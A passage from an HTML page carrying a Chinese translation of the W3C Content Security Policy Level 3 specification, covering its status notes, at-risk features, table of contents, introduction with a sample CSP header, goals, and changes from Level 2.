            则必须根据 <a href="https://www.w3.org/policies/patent-policy/#sec-Disclosure">W3C 专利政策第6节</a> 进行披露。</p>
        <p> 本文档受 <a href="https://www.w3.org/policies/process/20231103/" id="w3c_process_revision">2023年11月3日 W3C
                过程文档</a> 管辖。</p>
        <p></p>
    </div>
    <div data-fill-with="at-risk">
        <p>以下功能有风险，可能会在CR期间被删除: </p>
        <ul>
            <li><a href="#is-element-nonceable">§ 6.7.3.1 元素是否可标记?</a> 算法。
        </ul>
        <p>“有风险”是 W3C 过程中的专业术语，并不一定意味着该功能有被删除或延迟的危险。这意味着工作组认为该功能在及时实现时可能存在互操作性问题，
            标记为“有风险”允许工作组在转向提议推荐阶段时必要时删除该功能，而无需先发布不包含该功能的新候选推荐。</p>
    </div>
    <nav data-fill-with="table-of-contents" id="toc">
        <h2 class="no-num no-toc no-ref" id="contents">目录</h2>
        <ol class="toc" role="directory">
            <li>
                <a href="#intro"><span class="secno">1</span> <span class="content">简介</span></a>
                <ol class="toc">
                    <li>
                        <a href="#examples"><span class="secno">1.1</span> <span class="content">示例</span></a>
                        <ol class="toc">
                            <li><a href="#example-basic"><span class="secno">1.1.1</span> <span
                                        class="content">控制执行</span></a>
                        </ol>
                    <li><a href="#goals"><span class="secno">1.2</span> <span class="content">目标</span></a>
                    <li><a href="#changes-from-level-2"><span class="secno">1.3</span> <span
                                class="content">与第2级的变化</span></a>
                </ol>
            <li>
                <a href="#framework"><span class="secno">2</span> <span class="content">框架</span></a>
                <ol class="toc">
                    <li><a href="#framework-infrastructure"><span class="secno">2.1</span> <span
                                class="content">基础设施</span></a>
                    <li>
                        <a href="#framework-policy"><span class="secno">2.2</span> <span class="content">策略</span></a>
                        <ol class="toc">
                            <li><a href="#parse-serialized-policy"><span class="secno">2.2.1</span> <span
                                        class="content">解析序列化的CSP</span></a>
                            <li><a href="#parse-response-csp"><span class="secno">2.2.2</span> <span
                                        class="content">解析<var>response</var>的内容安全策略</span></a>
                        </ol>
                    <li>
                        <a href="#framework-directives"><span class="secno">2.3</span> <span
                                class="content">指令</span></a>
                        <ol class="toc">
                            <li><a href="#framework-directive-source-list"><span class="secno">2.3.1</span> <span
                                        class="content">源列表</span></a>
                        </ol>
                    <li>
                        <a href="#framework-violation"><span class="secno">2.4</span> <span
                                class="content">违反</span></a>
                        <ol class="toc">
                            <li><a href="#create-violation-for-global"><span class="secno">2.4.1</span> <span
                                        class="content">为<var>global</var>、<var>policy</var>和<var>directive</var>创建违反对象</span></a>
                            <li><a href="#create-violation-for-request"><span class="secno">2.4.2</span> <span
                                        class="content">为<var>request</var>和<var>policy</var>创建违反对象</span></a>
                        </ol>
                </ol>
            <li>
                <a href="#policy-delivery"><span class="secno">3</span> <span class="content">策略传递</span></a>
                <ol class="toc">
                    <li><a href="#csp-header"><span class="secno">3.1</span> <span
                                class="content"><code>Content-Security-Policy</code> HTTP 响应头字段</span></a>
                    <li><a href="#cspro-header"><span class="secno">3.2</span> <span
                                class="content"><code>Content-Security-Policy-Report-Only</code> HTTP 响应头字段</span></a>
                    <li><a href="#meta-element"><span class="secno">3.3</span> <span
                                class="content"><code>&lt;meta&gt;</code> 元素</span></a>
                </ol>
            <li>
                <a href="#integrations"><span class="secno">4</span> <span class="content">集成</span></a>
                <ol class="toc">
                    <li>
                        <a href="#fetch-integration"><span class="secno">4.1</span> <span
                                class="content">与Fetch的集成</span></a>
                        <ol class="toc">
                            <li><a href="#report-for-request"><span class="secno">4.1.1</span> <span
                                        class="content">报告<var>request</var>的内容安全策略违规</span></a>
                            <li><a href="#should-block-request"><span class="secno">4.1.2</span> <span
                                        class="content">请求 <var>request</var> 是否应被内容安全策略阻止？</span></a>
                            <li><a href="#should-block-response"><span class="secno">4.1.3</span> <span
                                        class="content">响应 <var>response</var> 对 <var>request</var>
                                        是否应被内容安全策略阻止？</span></a>
                            <li><a href="#potentially-report-hash"><span class="secno">4.1.4</span> <span
                                        class="content">可能报告哈希值</span></a>
                        </ol>
                    <li>
                        <a href="#html-integration"><span class="secno">4.2</span> <span
                                class="content">与HTML的集成</span></a>
                        <ol class="toc">
                            <li><a href="#run-document-csp-initialization"><span class="secno">4.2.1</span> <span
                                        class="content"> 运行 <code>CSP</code> 初始化用于 <code>Document</code>
                                    </span></a>
                            <li><a href="#get-csp-of-object"><span class="secno">4.2.2</span> <span class="content"> 获取
                                        <span>CSP 列表</span> 对于 <var>object</var> </span></a>
                            <li><a href="#should-block-inline"><span class="secno">4.2.3</span> <span class="content">
                                        元素 <var>element</var> 的内联 <var>type</var>
                                        行为是否应被内容安全策略阻止？</span></a>
                            <li><a href="#should-block-navigation-request"><span class="secno">4.2.4</span> <span
                                        class="content">类型为 <var>type</var> 的 <var>导航请求</var>
                                        是否应被内容安全策略阻止？</span></a>
                            <li><a href="#should-block-navigation-response"><span class="content">是否应内容安全策略阻止
                                        <var>target</var> 中 <var>navigation
                                            request</var> 的 <var>type</var> 导航响应 <var>navigation
                                            response</var>？</span></a>
                            <li><a href="#run-global-object-csp-initialization"><span class="secno">4.2.6</span> <span
                                        class="content">运行 <code>CSP</code> 初始化以处理全局对象</span></a>
                        </ol>
                    <li>
                        <a href="#webrtc-integration"><span class="secno">4.3</span> <span
                                class="content">与WebRTC的集成</span></a>
                        <ol class="toc">
                            <li><a href="#should-block-rtc-connection"><span class="secno">4.3.1</span> <span
                                        class="content">全局对象的 <var>global</var> RTC 连接是否应被阻止？</span></a>
                        </ol>
                    <li>
                        <a href="#ecma-integration"><span class="secno">4.4</span> <span
                                class="content">与ECMAScript的集成</span></a>
                        <ol class="toc">
                            <li><a href="#can-compile-strings"><span class="secno">4.4.1</span> <span
                                        class="content">EnsureCSPDoesNotBlockStringCompilation(<var>realm</var>,
                                        <var>parameterStrings</var>, <var>bodyString</var>, <var>codeString</var>,
                                        <var>compilationType</var>, <var>parameterArgs</var>,
                                        <var>bodyArg</var>)</span></a>
                        </ol>
                    <li>
                        <a href="#wasm-integration"><span class="secno">4.5</span> <span
                                class="content">与WebAssembly的集成</span></a>
                        <ol class="toc">
                            <li><a href="#can-compile-wasm-bytes"><span class="secno">4.5.1</span> <span
                                        class="content">EnsureCSPDoesNotBlockWasmByteCompilation<var>realm</var></span></a>
                        </ol>
                </ol>
            <li>
                <a href="#reporting"><span class="secno">5</span> <span class="content">报告</span></a>
                <ol class="toc">
                    <li><a href="#violation-events"><span class="secno">5.1</span> <span
                                class="content">违规DOM事件</span></a>
                    <li><a href="#obtain-violation-blocked-uri"><span class="secno">5.2</span> <span
                                class="content">获取违规<var>resource</var>的<code
                                    class="idl"><span>blockedURI</span></code></span></a>
                    <li><a href="#deprecated-serialize-violation"><span class="secno">5.3</span> <span
                                class="content">获取<var>violation</var>的已弃用序列化形式</span></a>
                    <li><a href="#strip-url-for-use-in-reports"><span class="secno">5.4</span> <span
                                class="content">用于报告的 URL 剥离</span></a>
                    <li><a href="#report-violation"><span class="secno">5.5</span> <span
                                class="content">报告<var>violation</var></span></a>
                </ol>
            <li>
                <a href="#csp-directives"><span class="secno">6</span> <span class="content">内容安全策略指令</span></a>
                <ol class="toc">
                    <li>
                        <a href="#directives-fetch"><span class="secno">6.1</span> <span class="content">获取指令</span></a>
                        <ol class="toc">
                            <li>
                                <a href="#directive-child-src"><span class="secno">6.1.1</span> <span
                                        class="content"><code>child-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#child-src-pre-request"><span class="secno">6.1.1.1</span> <span
                                                class="content"><code>child-src</code> 预请求检查</span></a>
                                    <li><a href="#child-src-post-request"><span class="secno">6.1.1.2</span> <span
                                                class="content"><code>child-src</code> 后请求检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-connect-src"><span class="secno">6.1.2</span> <span
                                        class="content"><code>connect-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#connect-src-pre-request"><span class="secno">6.1.2.1</span> <span
                                                class="content"><code>connect-src</code> 预请求检查</span></a>
                                    <li><a href="#connect-src-post-request"><span class="secno">6.1.2.2</span> <span
                                                class="content"><code>connect-src</code> 后请求检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-default-src"><span class="secno">6.1.3</span> <span
                                        class="content"><code>default-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#default-src-pre-request"><span class="secno">6.1.3.1</span> <span
                                                class="content"><code>default-src</code> 预请求检查</span></a>
                                    <li><a href="#default-src-post-request"><span class="secno">6.1.3.2</span> <span
                                                class="content"><code>default-src</code> 后请求检查</span></a>
                                    <li><a href="#default-src-inline"><span class="secno">6.1.3.3</span> <span
                                                class="content"><code>default-src</code> 内联检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-font-src"><span class="secno">6.1.4</span> <span
                                        class="content"><code>font-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#font-src-pre-request"><span class="secno">6.1.4.1</span> <span
                                                class="content"><code>font-src</code> 预请求检查</span></a>
                                    <li><a href="#font-src-post-request"><span class="secno">6.1.4.2</span> <span
                                                class="content"><code>font-src</code> 请求后检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-frame-src"><span class="secno">6.1.5</span> <span
                                        class="content"><code>frame-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#frame-src-pre-request"><span class="secno">6.1.5.1</span> <span
                                                class="content"><code>frame-src</code> 预请求检查</span></a>
                                    <li><a href="#frame-src-post-request"><span class="secno">6.1.5.2</span> <span
                                                class="content"><code>frame-src</code> 请求后检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-img-src"><span class="secno">6.1.6</span> <span
                                        class="content"><code>img-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#img-src-pre-request"><span class="secno">6.1.6.1</span> <span
                                                class="content"><code>img-src</code> 预请求检查</span></a>
                                    <li><a href="#img-src-post-request"><span class="secno">6.1.6.2</span> <span
                                                class="content"><code>img-src</code> 请求后检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-manifest-src"><span class="secno">6.1.7</span> <span
                                        class="content"><code>manifest-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#manifest-src-pre-request"><span class="secno">6.1.7.1</span> <span
                                                class="content"><code>manifest-src</code> 预请求检查</span></a>
                                    <li><a href="#manifest-src-post-request"><span class="secno">6.1.7.2</span> <span
                                                class="content"><code>manifest-src</code> 请求后检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-media-src"><span class="secno">6.1.8</span> <span
                                        class="content"><code>media-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#media-src-pre-request"><span class="secno">6.1.8.1</span> <span
                                                class="content"><code>media-src</code> 预请求检查</span></a>
                                    <li><a href="#media-src-post-request"><span class="secno">6.1.8.2</span> <span
                                                class="content"><code>media-src</code> 请求后检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-object-src"><span class="secno">6.1.9</span> <span
                                        class="content"><code>object-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#object-src-pre-request"><span class="secno">6.1.9.1</span> <span
                                                class="content"><code>object-src</code> 预请求检查</span></a>
                                    <li><a href="#object-src-post-request"><span class="secno">6.1.9.2</span> <span
                                                class="content"><code>object-src</code> 请求后检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-script-src"><span class="secno">6.1.10</span> <span
                                        class="content"><code>script-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#script-src-pre-request"><span class="secno">6.1.10.1</span> <span
                                                class="content"><code>script-src</code> 预请求检查</span></a>
                                    <li><a href="#script-src-post-request"><span class="secno">6.1.10.2</span> <span
                                                class="content"><code>script-src</code> 后请求检查</span></a>
                                    <li><a href="#script-src-inline"><span class="secno">6.1.10.3</span> <span
                                                class="content"><code>script-src</code> 内联检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-script-src-elem"><span class="secno">6.1.11</span> <span
                                        class="content"><code>script-src-elem</code></span></a>
                                <ol class="toc">
                                    <li><a href="#script-src-elem-pre-request"><span class="secno">6.1.11.1</span> <span
                                                class="content"><code>script-src-elem</code> 预请求检查</span></a>
                                    <li><a href="#script-src-elem-post-request"><span class="secno">6.1.11.2</span>
                                            <span class="content"><code>script-src-elem</code> 后请求检查</span></a>
                                    <li><a href="#script-src-elem-inline"><span class="secno">6.1.11.3</span> <span
                                                class="content"><code>script-src-elem</code> 内联检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-script-src-attr"><span class="secno">6.1.12</span> <span
                                        class="content"><code>script-src-attr</code></span></a>
                                <ol class="toc">
                                    <li><a href="#script-src-attr-inline"><span class="secno">6.1.12.1</span> <span
                                                class="content"><code>script-src-attr</code> 内联检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-style-src"><span class="secno">6.1.13</span> <span
                                        class="content"><code>style-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#style-src-pre-request"><span class="secno">6.1.13.1</span> <span
                                                class="content"><code>style-src</code> 预请求检查</span></a>
                                    <li><a href="#style-src-post-request"><span class="secno">6.1.13.2</span> <span
                                                class="content"><code>style-src</code> 后请求检查</span></a>
                                    <li><a href="#style-src-inline"><span class="secno">6.1.13.3</span> <span
                                                class="content"><code>style-src</code> 内联检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-style-src-elem"><span class="secno">6.1.14</span> <span
                                        class="content"><code>style-src-elem</code></span></a>
                                <ol class="toc">
                                    <li><a href="#style-src-elem-pre-request"><span class="secno">6.1.14.1</span> <span
                                                class="content"><code>style-src-elem</code> 前请求检查</span></a>
                                    <li><a href="#style-src-elem-post-request"><span class="secno">6.1.14.2</span> <span
                                                class="content"><code>style-src-elem</code> 后请求检查</span></a>
                                    <li><a href="#style-src-elem-inline"><span class="secno">6.1.14.3</span> <span
                                                class="content"><code>style-src-elem</code> 内联检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-style-src-attr"><span class="secno">6.1.15</span> <span
                                        class="content"><code>style-src-attr</code></span></a>
                                <ol class="toc">
                                    <li><a href="#style-src-attr-inline"><span class="secno">6.1.15.1</span> <span
                                                class="content"><code>style-src-attr</code> 内联检查</span></a>
                                </ol>
                        </ol>
                    <li>
                        <a href="#directives-other"><span class="secno">6.2</span> <span class="content">其他指令</span></a>
                        <ol class="toc">
                            <li>
                                <a href="#directive-webrtc"><span class="secno">6.2.1</span> <span
                                        class="content"><code>webrtc</code></span></a>
                                <ol class="toc">
                                    <li><a href="#webrtc-pre-connect"><span class="secno">6.2.1.1</span> <span
                                                class="content"><code>webrtc</code> 预连接检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-worker-src"><span class="secno">6.2.2</span> <span
                                        class="content"><code>worker-src</code></span></a>
                                <ol class="toc">
                                    <li><a href="#worker-src-pre-request"><span class="secno">6.2.2.1</span> <span
                                                class="content"><code>worker-src</code> 预请求检查</span></a>
                                    <li><a href="#worker-src-post-request"><span class="secno">6.2.2.2</span> <span
                                                class="content"><code>worker-src</code> 后请求检查</span></a>
                                </ol>
                        </ol>
                    <li>
                        <a href="#directives-document"><span class="secno">6.3</span> <span
                                class="content">文档指令</span></a>
                        <ol class="toc">
                            <li>
                                <a href="#directive-base-uri"><span class="secno">6.3.1</span> <span
                                        class="content"><code>base-uri</code></span></a>
                                <ol class="toc">
                                    <li><a href="#allow-base-for-document"><span class="secno">6.3.1.1</span> <span
                                                class="content"><var>base</var> 是否允许用于 <var>document</var>？</span></a>
                                </ol>
                            <li>
                                <a href="#directive-sandbox"><span class="secno">6.3.2</span> <span
                                        class="content"><code>sandbox</code></span></a>
                                <ol class="toc">
                                    <li><a href="#sandbox-init"><span class="secno">6.3.2.1</span> <span
                                                class="content"><code>sandbox</code> 初始化</span></a>
                                </ol>
                        </ol>
                    <li>
                        <a href="#directives-navigation"><span class="secno">6.4</span> <span
                                class="content">导航指令</span></a>
                        <ol class="toc">
                            <li>
                                <a href="#directive-form-action"><span class="secno">6.4.1</span> <span
                                        class="content"><code>form-action</code></span></a>
                                <ol class="toc">
                                    <li><a href="#form-action-pre-navigate"><span class="secno">6.4.1.1</span> <span
                                                class="content"><code>form-action</code> 预导航检查</span></a>
                                </ol>
                            <li>
                                <a href="#directive-frame-ancestors"><span class="secno">6.4.2</span> <span
                                        class="content"><code>frame-ancestors</code></span></a>
                                <ol class="toc">
                                    <li><a href="#frame-ancestors-navigation-response"><span
                                                class="secno">6.4.2.1</span> <span
                                                class="content"><code>frame-ancestors</code> 导航响应检查</span></a>
                                    <li><a href="#frame-ancestors-and-frame-options"><span class="secno">6.4.2.2</span>
                                            <span class="content"> 与
                                                `<code>`<code><span>X-Frame-Options</span></code>`</code>`
                                                的关系</span></a>
                                </ol>
                        </ol>
                    <li>
                        <a href="#directives-reporting"><span class="secno">6.5</span> <span
                                class="content">报告指令</span></a>
                        <ol class="toc">
                            <li><a href="#directive-report-uri"><span class="secno">6.5.1</span> <span
                                        class="content"><code>report-uri</code></span></a>
                            <li><a href="#directive-report-to"><span class="secno">6.5.2</span> <span
                                        class="content"><code>report-to</code></span></a>
                        </ol>
                    <li><a href="#directives-elsewhere"><span class="secno">6.6</span> <span
                                class="content">其他文档中定义的指令</span></a>
                    <li>
                        <a href="#matching-algorithms"><span class="secno">6.7</span> <span
                                class="content">匹配算法</span></a>
                        <ol class="toc">
                            <li>
                                <a href="#script-checks"><span class="secno">6.7.1</span> <span
                                        class="content">脚本指令检查</span></a>
                                <ol class="toc">
                                    <li><a href="#script-pre-request"><span class="secno">6.7.1.1</span> <span
                                                class="content">脚本指令的预请求检查</span></a>
                                    <li><a href="#script-post-request"><span class="secno">6.7.1.2</span> <span
                                                class="content">脚本指令的后请求检查</span></a>
                                </ol>
                            <li>
                                <a href="#matching-urls"><span class="secno">6.7.2</span> <span class="content">URL
                                        匹配</span></a>
                                <ol class="toc">
                                    <li><a href="#does-request-violate-policy"><span class="secno">6.7.2.1</span> <span
                                                class="content"><var>request</var> 是否违反 <var>policy</var>？</span></a>
                                    <li><a href="#does-resource-hint-violate-policy"><span class="secno">6.7.2.2</span>
                                            <span class="content">资源提示 <var>request</var> 是否违反
                                                <var>policy</var>？</span></a>
                                    <li><a href="#match-nonce-to-source-list"><span class="secno">6.7.2.3</span> <span
                                                class="content"><var>nonce</var> 是否匹配 <var>源列表</var>？</span></a>
                                    <li><a href="#match-integrity-metadata-to-source-list"><span
                                                class="secno">6.7.2.4</span> <span class="content"><var>integrity
                                                    metadata</var>
                                                是否匹配 <var>源列表</var>？</span></a>
                                    <li><a href="#match-request-to-source-list"><span class="secno">6.7.2.5</span> <span
                                                class="content"><var>request</var> 是否匹配 <var>源列表</var>？</span></a>
                                    <li><a href="#match-response-to-source-list"><span class="secno">6.7.2.6</span>
                                            <span class="content"><var>request</var> 的 <var>响应</var> 是否匹配
                                                <var>源列表</var>？</span></a>
                                    <li><a href="#match-url-to-source-list"><span class="secno">6.7.2.7</span> <span
                                                class="content"> <var>url</var>
                                                是否匹配 <var>source list</var> 中的表达式及 <var>redirect count</var>？
                                            </span></a>
                                    <li><a href="#match-url-to-source-expression"><span class="secno">6.7.2.8</span>
                                            <span class="content">
                                                <var>url</var> 是否匹配 <var>origin</var> 中的 <var>expression</var> 及
                                                <var>redirect count</var>？
                                            </span></a>
                                    <li><a href="#match-schemes"><span class="secno">6.7.2.9</span> <span
                                                class="content"><code>scheme-part</code> 匹配</span></a>
                                    <li><a href="#match-hosts"><span class="secno">6.7.2.10</span> <span
                                                class="content"><code>host-part</code> 匹配</span></a>
                                    <li><a href="#match-ports"><span class="secno">6.7.2.11</span> <span
                                                class="content"><code>port-part</code> 匹配</span></a>
                                    <li><a href="#match-paths"><span class="secno">6.7.2.12</span> <span
                                                class="content"><code>path-part</code> 匹配</span></a>
                                </ol>
                            <li>
                                <a href="#matching-elements"><span class="secno">6.7.3</span> <span
                                        class="content">元素匹配算法</span></a>
                                <ol class="toc">
                                    <li><a href="#is-element-nonceable"><span class="secno">6.7.3.1</span> <span
                                                class="content"><var>element</var> 是否可以添加 <var>nonce</var>？</span></a>
                                    <li><a href="#allow-all-inline"><span class="secno">6.7.3.2</span> <span
                                                class="content"> 源列表是否允许所有内联行为用于
                                                <var>type</var>？</span></a>
                                    <li><a href="#match-element-to-source-list"><span class="secno">6.7.3.3</span><span
                                                class="content"> <var>element</var> 是否匹配 <var>type</var> 和
                                                <var>source</var> 的源列表？</span></a>
                                </ol>
                        </ol>
                    <li>
                        <a href="#directive-algorithms"><span class="secno">6.8</span> <span
                                class="content">指令算法</span></a>
                        <ol class="toc">
                            <li><a href="#effective-directive-for-a-request"><span class="secno">6.8.1</span> <span
                                        class="content">获取 <var>request</var> 的有效指令</span></a>
                            <li><a href="#effective-directive-for-inline-check"><span class="secno">6.8.2</span> <span
                                        class="content">获取用于内联检查的有效指令</span></a>
                            <li><a href="#directive-fallback-list"><span class="secno">6.8.3</span> <span
                                        class="content">获取提取指令的回退列表</span></a>
                            <li><a href="#should-directive-execute"><span class="secno">6.8.4</span> <span
                                        class="content">判断是否应执行提取指令</span></a>
                        </ol>
                </ol>
            <li>
                <a href="#security-considerations"><span class="secno">7</span> <span
                        class="content">安全和隐私注意事项</span></a>
                <ol class="toc">
                    <li><a href="#security-nonces"><span class="secno">7.1</span> <span class="content">Nonce
                                重用</span></a>
                    <li>
                        <a href="#security-nonce-hijacking"><span class="secno">7.2</span> <span class="content">Nonce
                                劫持</span></a>
                        <ol class="toc">
                            <li><a href="#dangling-markup-attacks"><span class="secno">7.2.1</span> <span
                                        class="content">悬空标记攻击</span></a>
                            <li><a href="#nonce-exfiltration-content-attributes"><span class="secno">7.2.2</span> <span
                                        class="content">通过内容属性的 Nonce 泄露</span></a>
                        </ol>
                    <li><a href="#security-nonce-retargeting"><span class="secno">7.3</span> <span class="content">Nonce
                                重定向</span></a>
                    <li><a href="#security-css-parsing"><span class="secno">7.4</span> <span class="content">CSS
                                解析</span></a>
                    <li><a href="#security-violation-reports"><span class="secno">7.5</span> <span
                                class="content">违规报告</span></a>
                    <li><a href="#source-list-paths-and-redirects"><span class="secno">7.6</span> <span
                                class="content">路径和重定向</span></a>
                    <li><a href="#security-secure-upgrades"><span class="secno">7.7</span> <span
                                class="content">安全升级</span></a>
                    <li><a href="#security-inherit-csp"><span class="secno">7.8</span> <span class="content">CSP
                                继承以避免绕过</span></a>
                </ol>
            <li>
                <a href="#authoring-considerations"><span class="secno">8</span> <span class="content">编写注意事项</span></a>
                <ol class="toc">
                    <li><a href="#multiple-policies"><span class="secno">8.1</span> <span
                                class="content">多策略的影响</span></a>
                    <li><a href="#strict-dynamic-usage"><span class="secno">8.2</span> <span class="content">
                                "<code>'strict-dynamic'</code>" 的使用 </span></a>
                    <li><a href="#unsafe-hashes-usage"><span class="secno">8.3</span> <span class="content">
                                "<code>'unsafe-hashes'</code>" 的使用</span></a>
                    <li><a href="#external-hash"><span class="secno">8.4</span> <span class="content">通过哈希允许外部
                                JavaScript</span></a>
                    <li><a href="#strict-csp"><span class="secno">8.5</span> <span class="content">Strict
                                CSP（严格内容安全策略）</span></a>
                    <li><a href="#exfiltration"><span class="secno">8.6</span> <span class="content">数据泄漏</span></a>
                </ol>
            <li>
                <a href="#implementation-considerations"><span class="secno">9</span> <span
                        class="content">实现注意事项</span></a>
                <ol class="toc">
                    <li><a href="#extensions"><span class="secno">9.1</span> <span
                                class="content">特定供应商的扩展和插件</span></a>
                </ol>
            <li>
                <a href="#iana-considerations"><span class="secno">10</span> <span class="content">IANA 考虑事项</span></a>
                <ol class="toc">
                    <li><a href="#iana-registry"><span class="secno">10.1</span> <span class="content">指令注册表</span></a>
                    <li>
                        <a href="#iana-headers"><span class="secno">10.2</span> <span class="content">头部</span></a>
                        <ol class="toc">
                            <li><a href="#iana-csp"><span class="secno">10.2.1</span> <span
                                        class="content">Content-Security-Policy</span></a>
                            <li><a href="#iana-cspro"><span class="secno">10.2.2</span> <span
                                        class="content">Content-Security-Policy-Report-Only</span></a>
                        </ol>
                </ol>
            <li><a href="#acknowledgements"><span class="secno">11</span> <span class="content">致谢</span></a>
            <li>
                <a href="#w3c-conformance"><span class="secno"></span> <span class="content">一致性</span></a>
                <ol class="toc">
                    <li><a href="#w3c-conventions"><span class="secno"></span> <span class="content">文档约定</span></a>
                    <li><a href="#w3c-conformant-algorithms"><span class="secno"></span> <span
                                class="content">符合规范的算法</span></a>
                </ol>
            <li>
                <a href="#index"><span class="secno"></span> <span class="content">索引</span></a>
                <ol class="toc">
                    <li><a href="#index-defined-here"><span class="secno"></span> <span
                                class="content">本规范定义的术语</span></a>
                    <li><a href="#index-defined-elsewhere"><span class="secno"></span> <span
                                class="content">通过引用定义的术语</span></a>
                </ol>
            <li>
                <a href="#references"><span class="secno"></span> <span class="content">参考文献</span></a>
                <ol class="toc">
                    <li><a href="#normative"><span class="secno"></span> <span class="content">规范性参考文献</span></a>
                    <li><a href="#informative"><span class="secno"></span> <span class="content">说明性参考文献</span></a>
                </ol>
            <li><a href="#idl-index"><span class="secno"></span> <span class="content">IDL 索引</span></a>
            <li><a href="#issues-index"><span class="secno"></span> <span class="content">问题索引</span></a>
        </ol>
    </nav>
    <main>
        <section>
            <h2 class="heading settled" data-level="1" id="intro"><span class="secno">1. </span><span
                    class="content">简介</span><a class="self-link" href="#intro"></a></h2>
            <p><em>本节并非规范性内容。</em></p>
            <p>本文档定义了<dfn class="dfn-paneled" data-dfn-type="dfn" data-export id="content-security-policy">内容安全策略</dfn>
                (CSP)，开发者可以使用它以多种方式锁定他们的应用程序，从而减轻诸如跨站脚本等内容注入漏洞的风险，并降低其应用程序的执行权限。</p>
            <p>CSP 并非针对内容注入漏洞的第一道防线。相反，CSP 最好用作深度防御。它可以减少恶意注入可能造成的危害，但不能代替谨慎的输入验证和输出编码。</p>
            <p>本文档是内容安全策略第 2 级的迭代，旨在更清楚地解释 CSP、HTML 和 Fetch 之间的交互，同时提供清晰的模块化扩展钩子。理想情况下，这将形成一个稳定的核心，我们可以在此基础上构建新功能。</p>
            <h3 class="heading settled" data-level="1.1" id="examples"><span class="secno">1.1. </span><span
                    class="content">示例</span><a class="self-link" href="#examples"></a></h3>
            <h4 class="heading settled" data-level="1.1.1" id="example-basic"><span class="secno">1.1.1. </span><span
                    class="content">控制执行</span><a class="self-link" href="#example-basic"></a></h4>
            <div class="example" id="example-1a2032b4">
                <a class="self-link" href="#example-1a2032b4"></a> MegaCorp Inc 的开发者希望保护自己免受跨站脚本攻击。他们可以通过确保只有受信任的 CDN
                是脚本加载和执行的唯一来源，从而减轻脚本注入的风险。此外，他们希望确保没有插件可以在其页面上下文中执行。以下策略实现了这一效果：
                <pre><a data-link-type="http-header" href="#header-content-security-policy" id="ref-for-header-content-security-policy">Content-Security-Policy</a>: script-src https://cdn.example.com/scripts/; object-src 'none'</pre>
            </div>
            <h3 class="heading settled" data-level="1.2" id="goals"><span class="secno">1.2. </span><span
                    class="content">目标</span><a class="self-link" href="#goals"></a></h3>
            <p>内容安全策略旨在完成一些相关的任务：</p>
            <ol>
                <li data-md>
                    <p>通过为开发者提供较为精细的控制来降低内容注入攻击的风险，包括：</p>
                    <ul>
                        <li data-md>
                            <p>可以为特定的 <code
                                    class="idl"><a data-link-type="idl" href="https://dom.spec.whatwg.org/#document" id="ref-for-document">Document</a></code>
                                或 <code
                                    class="idl"><a data-link-type="idl" href="https://html.spec.whatwg.org/multipage/workers.html#worker" id="ref-for-worker">Worker</a></code>
                                请求（并随后嵌入或执行）的资源</p>
                        <li data-md>
                            <p>内联脚本的执行</p>
                        <li data-md>
                            <p>动态代码执行（通过 <code
                                    class="idl"><a data-link-type="idl" href="https://tc39.github.io/ecma262#sec-eval-x" id="ref-for-sec-eval-x">eval()</a></code>
                                和类似构造）</p>
                        <li data-md>
                            <p>内联样式的应用</p>
                    </ul>
                <li data-md>
                    <p>通过提供精细的控制来减少嵌入恶意上下文（如“像素完美”攻击所述）的风险。</p>
                <li data-md>
                    <p>提供一个策略框架，使开发者能够减少其应用程序的权限。</p>
                <li data-md>
                    <p>提供一种报告机制，允许开发者检测到在实际环境中被利用的漏洞。</p>
            </ol>
            <h3 class="heading settled" data-level="1.3" id="changes-from-level-2"><span class="secno">1.3. </span><span
                    class="content">与第 2 级的变化</span><a class="self-link" href="#changes-from-level-2"></a></h3>
            <p>本文档描述了内容安全策略第 2 级规范的演进版本<a data-link-type="biblio" href="#biblio-csp2"
                    title="Content Security Policy Level 2">[CSP2]</a>。以下是变化的概述：</p>
            <ol>
                <li data-md>
                    <p>该规范从头开始根据 <a data-link-type="biblio" href="#biblio-fetch" title="Fetch Standard">[FETCH]</a>
                        规范重写，这使得更容易将 CSP 的要求和限制与其他规范（尤其是与 Service Workers）集成。</p>
                <li data-md>
                    <p><code>child-src</code> 模型已经进行了重大修改：</p>
                    <ol>
                        <li data-md>
                            <p><code>frame-src</code> 指令在 CSP 第 2 级中被弃用，但现在已取消弃用，且若不存在时仍会退化为
                                <code>child-src</code>（它又会退化为 <code>default-src</code>）。
                            </p>
                        <li data-md>
                            <p>添加了 <code>worker-src</code> 指令，若不存在则退化为 <code>child-src</code>（同样最终退化为
                                <code>script-src</code>，再退化为 <code>default-src</code>）。
                            </p>
                    </ol>
                <li data-md>
                    <p>URL 匹配算法现在将不安全的方案和端口视为与其安全变体相匹配。也就是说，源表达式 <code>http://example.com:80</code> 将同时匹配
                        <code>http://example.com:80</code> 和 <code>https://example.com:443</code>。
                    </p>
                    <p>同样，<code>'self'</code> 现在会匹配页面起源的 <code>https:</code> 和 <code>wss:</code> 变体，即使页面的方案为
                        <code>http</code>。
                    </p>
                <li data-md>
                    <p>从内联脚本或样式生成的违规报告现在会将“<code>inline</code>”作为被阻止的资源。同样，被阻止的 <code>eval()</code>
                        执行将报告为“<code>eval</code>”。</p>
                <li data-md>
                    <p>添加了 <code>manifest-src</code> 指令。</p>
